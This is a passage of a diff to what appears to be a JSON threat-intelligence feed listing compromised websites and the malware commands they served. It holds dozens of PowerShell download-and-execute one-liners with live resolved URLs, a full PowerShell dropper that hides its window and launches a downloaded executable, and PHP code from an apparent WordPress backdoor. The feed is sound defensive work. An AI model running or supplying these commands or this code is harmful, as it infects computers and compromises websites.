+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8yhsv02bkm0oml578d8jcp"
+  },
+  {
+    "UrlDomain": "kamscandy.us",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "162.241.253.222"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8ygz0n2biz0omlb46bv8nd"
+  },
+  {
+    "UrlDomain": "duluziluminacao.com.br",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "108.167.188.165"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8yer1e2bgw0omlrdl4ew2k"
+  },
+  {
+    "UrlDomain": "compudocshop.ie",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "78.153.218.43"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8y9bwu2b1c0oml3f442ec1"
+  },
+  {
+    "UrlDomain": "kaitlynnclarkson.com",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "108.179.232.15"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8y5tur2axj0omlnel9vqyq"
+  },
+  {
+    "UrlDomain": "juninhocassimiro.com",
+    "DeliveryUrl": [
+      "likingdropout.site",
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "162.241.2.20"
+    ],
+    "Related": [],
+    "Payload": "$tok='ItnggAAsB5qwM28Gu-ICcYNuXGF525aEsxY6KXqxDsw';$id='55579f89b4acf055';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmw8y41h82asd0omldlecn1c5"
+  },
+  {
+    "UrlDomain": "mgmwremodeling.com",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "34.69.132.134"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8y2sfp2aqy0omlu74x3wee"
+  },
+  {
+    "UrlDomain": "www.allcoastinteriorlinings.com.au",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "27.124.112.1"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8y0ngj2alg0omll9asbj1f"
+  },
+  {
+    "UrlDomain": "khadijafreshfood.com",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "151.106.125.7"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8xy9r92abs0omlfipxevzk"
+  },
+  {
+    "UrlDomain": "estreladecristoec.org",
+    "DeliveryUrl": [
+      "cosmical2049.com"
+    ],
+    "PayloadUrl": [
+      "https://cosmical2049.com/startapv2/f9b9bfb54f8b30ec"
+    ],
+    "IP": [
+      "46.202.145.242"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://cosmical2049[.]com/startapv2/f9b9bfb54f8b30ec' -UserAgent 'WUA/b1d0126493' -Headers @{'X-WUA'='b1d0126493'})|iex",
+    "ResolvedDownloadUrl": [
+      "https://cosmical2049.com/startapv2/f9b9bfb54f8b30ec"
+    ],
+    "ReportId": "cmw8xxtdc2aab0omlcf7pf3sg"
+  },
+  {
+    "UrlDomain": "www.designsdaddy.com",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "162.241.85.38"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8xq27y29xs0oml76y50kab"
+  },
+  {
+    "UrlDomain": "femelifeivf.com",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "162.214.80.130"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8xoqcq29wa0omljsme239q"
+  },
+  {
+    "UrlDomain": "www.schlosserei-plieschnig.at",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "185.51.8.50"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803"
+    ],
+    "ReportId": "cmw8xmvez29rd0oml4h70sgcb"
+  },
+  {
+    "UrlDomain": "www.sullaviadiulisse.it",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.109.27"
+    ],
+    "Related": [
+      {
+        "Value": "https://gist.github.com/2ed604986db6a2f7b98b",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "IRM gl[.]githack[.]com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803"
+    ],
+    "ReportId": "cmw8xl8md29lb0omldp1lc4p5"
+  },
+  {
+    "UrlDomain": "www.amfd83.fr",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "213.186.33.24"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8xhdsa29h60omla79nljoa"
+  },
+  {
+    "UrlDomain": "www.thebigred.it",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.106.88"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803"
+    ],
+    "ReportId": "cmw8wnjce28520omlftbpbnhd"
+  },
+  {
+    "UrlDomain": "www.chirurgiatesta-collo.it",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.109.64"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803"
+    ],
+    "ReportId": "cmw8wlrhx28040omls8oiiiqs"
+  },
+  {
+    "UrlDomain": "techscription.us",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "67.205.29.64"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8wl9fk27z30oml6il39k68"
+  },
+  {
+    "UrlDomain": "cursol.com.br",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "192.185.211.221"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8wiihb27tb0oml4x3mf11j"
+  },
+  {
+    "UrlDomain": "www.nadiafabbrolati.it",
+    "DeliveryUrl": [
+      "fastly.jsdelivr.net"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.108.60"
+    ],
+    "Related": [
+      {
+        "Value": "https://gist.github.com/2ed604986db6a2f7b98b",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "ResolvedDownloadUrl": [
+      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
+    ],
+    "ReportId": "cmw8wi5pc27si0omln3w2d5bq"
+  },
+  {
+    "UrlDomain": "www.itrecamini.it",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.105.62"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803"
+    ],
+    "ReportId": "cmw8wh7ef27po0omle9uh0utk"
+  },
+  {
+    "UrlDomain": "dgxlearning.com",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "119.18.54.59"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8wh2dx27o70omlpd3tp66t"
+  },
+  {
+    "UrlDomain": "gattal.com",
+    "DeliveryUrl": [
+      "cosmical2049.com"
+    ],
+    "PayloadUrl": [
+      "https://cosmical2049.com/startapv2/f9b9bfb54f8b30ec"
+    ],
+    "IP": [
+      "69.163.143.75"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://cosmical2049[.]com/startapv2/f9b9bfb54f8b30ec' -UserAgent 'WUA/b1d0126493' -Headers @{'X-WUA'='b1d0126493'})|iex",
+    "ResolvedDownloadUrl": [
+      "https://cosmical2049.com/startapv2/f9b9bfb54f8b30ec"
+    ],
+    "ReportId": "cmw8wg9f727m90omlhf499nfm"
+  },
+  {
+    "UrlDomain": "camposderoca.com",
+    "DeliveryUrl": [
+      "t-trustresnew.com"
+    ],
+    "PayloadUrl": [
+      "https://t-trustresnew.com/Girya/af5734623e6eccb3"
+    ],
+    "IP": [
+      "179.43.116.166"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://t-trustresnew[.]com/Girya/af5734623e6eccb3')|iex",
+    "ResolvedDownloadUrl": [
+      "https://t-trustresnew.com/Girya/af5734623e6eccb3"
+    ],
+    "ReportId": "cmw8wa50e27cu0oml8fw7ot3c"
+  },
+  {
+    "UrlDomain": "waterqualityorganization.org",
+    "DeliveryUrl": [
+      "likingdropout.site",
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "80.74.150.110"
+    ],
+    "Related": [],
+    "Payload": "$tok='IGFNgauuVOmb200hsic7HDDDuL-YcXBx_DcbnEG5eLg';$id='5b69edd2593c861c';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmw8w4l7q272s0omlavb907i1"
+  },
+  {
+    "UrlDomain": "www.infolinet.eu",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.109.70"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803"
+    ],
+    "ReportId": "cmw8w13gj26ws0omlp3nk7yxf"
+  },
+  {
+    "UrlDomain": "shivesh.group",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "162.241.123.158"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8vq1e426hz0omlpkvgyzx0"
+  },
+  {
+    "UrlDomain": "sunplusja.com",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "192.254.189.253"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8vbfut25sz0oml9jcpskyj"
+  },
+  {
+    "UrlDomain": "katypnose.fr",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "146.59.209.152"
+    ],
+    "Related": [
+      {
+        "Value": "https://www.instagram.com/cathypnose77/",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8va8cs25q10omlk45er4fd"
+  },
+  {
+    "UrlDomain": "www.laboratoriodipsicologia.it",
+    "DeliveryUrl": [
+      "fastly.jsdelivr.net"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.106.26"
+    ],
+    "Related": [],
+    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "ResolvedDownloadUrl": [
+      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
+    ],
+    "ReportId": "cmw8v9k0f25p90omldjeh182z"
+  },
+  {
+    "UrlDomain": "www.moonandtyde.com",
+    "DeliveryUrl": [
+      "err12.online"
+    ],
+    "PayloadUrl": [
+      "https://err12.online/MPN34CUssTOxul1S=9aa1f611e4d27fce"
+    ],
+    "IP": [
+      "91.108.98.20"
+    ],
+    "Related": [],
+    "Payload": "irm 'https://err12[.]online/MPN34CUssTOxul1S=9aa1f611e4d27fce' | iex;",
+    "ResolvedDownloadUrl": [
+      "https://err12.online/MPN34CUssTOxul1S=9aa1f611e4d27fce"
+    ],
+    "ReportId": "cmw8v6gwt25dh0omltgqtmmjd"
+  },
+  {
+    "UrlDomain": "vivalayoga.de",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "81.169.145.82"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803"
+    ],
+    "ReportId": "cmw8v3m4p25c60omll9wdrlb7"
+  },
+  {
+    "UrlDomain": "www.fruitdelice.it",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.106.77"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/rytu08-74/cc2f-bf9b9-76a8-f5-a-0a43c2/-/raw/main/4-4dEA-d-b803"
+    ],
+    "ReportId": "cmw8upwsl24q70omlk5d9348w"
+  },
+  {
+    "UrlDomain": "empire-clothing.com",
+    "DeliveryUrl": [
+      "frclau.com"
+    ],
+    "PayloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "IP": [
+      "77.37.83.207"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://frclau.com/eoN"
+    ],
+    "ReportId": "cmw8unshl24of0oml3g305qzl"
+  },
+  {
+    "UrlDomain": "paymanweddings.com",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "208.97.146.144"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8ul00d24kj0omloc83aamq"
+  },
+  {
+    "UrlDomain": "merchantdude.com",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "148.72.90.58"
+    ],
+    "Related": [
+      {
+        "Value": "https://wa.me/919663025636?text=hi%20pmap",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8uiu3j24fp0omlkiybgric"
+  },
+  {
+    "UrlDomain": "solyne.com",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "82.208.23.184"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8uh70524bw0omlaskwjtbl"
+  },
+  {
+    "UrlDomain": "fpinmobiliaria.com.ar",
+    "DeliveryUrl": [
+      "fastly.jsdelivr.net"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "167.250.5.47"
+    ],
+    "Related": [],
+    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "ResolvedDownloadUrl": [
+      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
+    ],
+    "ReportId": "cmw8ugfu224ab0omlylbb1laz"
+  },
+  {
+    "UrlDomain": "www.santamariadiognina.it",
+    "DeliveryUrl": [
+      "fastly.jsdelivr.net"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.108.54"
+    ],
+    "Related": [],
+    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "ResolvedDownloadUrl": [
+      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
+    ],
+    "ReportId": "cmw8uf2tw245m0omlubwlc0vv"
+  },
+  {
+    "UrlDomain": "administrationvisa.com",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "162.241.61.139"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8u56nh23p00omllkheic3x"
+  },
+  {
+    "UrlDomain": "evgeniya.info",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "78.142.63.8"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8u2iag23i20oml5942uu5c"
+  },
+  {
+    "UrlDomain": "bestroofs.com",
+    "DeliveryUrl": [
+      "gl.githack.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "209.126.25.155"
+    ],
+    "Related": [],
+    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
+    ],
+    "ReportId": "cmw8tys4823d20omlhuzrneog"
+  },
+  {
+    "UrlDomain": "minneolasg.com",
+    "DeliveryUrl": [
+      "fastly.jsdelivr.net"
+    ],
